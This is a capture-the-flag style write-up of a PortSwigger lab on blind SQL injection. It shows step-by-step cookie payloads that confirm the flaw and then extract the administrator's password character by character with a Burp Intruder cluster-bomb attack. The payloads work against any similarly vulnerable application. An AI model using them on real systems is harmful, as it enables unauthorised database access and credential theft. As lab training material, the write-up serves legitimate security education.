https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

Lab objective: `Log in as the administrator user.`

The database contains a different table called `users`, with columns called `username` and `password`.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

# Lab: Blind SQL injection with conditional responses

We know that This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

So we will try on tracking cookies

1. We get `Welcome back!` in this query `TrackingId=Ch576wpFtyryfXOj' AND 1=1--` but not in this query `TrackingId=Ch576wpFtyryfXOj' AND 1=2--` so `TrackingId` have SQLi.
2. `TrackingId=Ch576wpFtyryfXOj' AND (SELECT 'X' FROM users LIMIT 1)='X'--` The query return true mean there have users table and users table is not empty. Here `LIMIT 1` mean return 1st row of the `users` table and check 'X'='X' 
3. `TrackingId=Ch576wpFtyryfXOj' AND (SELECT username FROM users WHERE username='administrator')='administrator'--` This query will check there have any username column and there have administrator username.
4. `TrackingId=Ch576wpFtyryfXOj' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator'--` This query will find length of the password. The length of the password is 20.
5. `TrackingId=Ch576wpFtyryfXOj' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'a'` This query will find the first letter of the password is bigger then a.
6. Now we will send the the query to `intruder tab` and make some of changes `TrackingId=Ch576wpFtyryfXOj' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--` this 2 will variable. we will use 1 to 20 for the `SUBSTRING` and a to z  and 0 to 9 for the `a`. And we will user cluster bomb attack for this.
7. We find the password by the attack `romlspykjnui6ha9qhmb` (Chang every-time).
8. Now login. And solve the lab.
